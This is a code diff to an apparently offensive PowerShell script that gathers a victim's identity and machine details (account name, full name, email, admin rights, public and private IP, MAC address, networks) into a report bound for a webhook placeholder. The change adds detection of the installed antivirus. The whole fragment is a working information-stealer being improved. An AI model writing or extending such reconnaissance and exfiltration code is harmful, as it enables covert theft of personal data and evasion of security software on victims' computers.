@@ -2,7 +2,7 @@
 # created by : C0SM0
 
 # change me
-$webhook = "WEBHOOK"
+$webhook = "WEBHOOK HERE"
 
 # variables
 $account = $env:userprofile.Split('\')[2]
@@ -124,6 +124,7 @@ function user_markdown {
     $full_name = Get-fullName
     $email = Get-email
     $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
+    $antivirus = Get-AntivirusSolution
 
     # create markdown content
     $content = @"
@@ -142,6 +143,9 @@ function user_markdown {
 - Public : $public
 - Private : $private
 - MAC : $MAC
+
+## PC Information
+- Antivirus : $antivirus
 
 ## Connected Networks
 "@
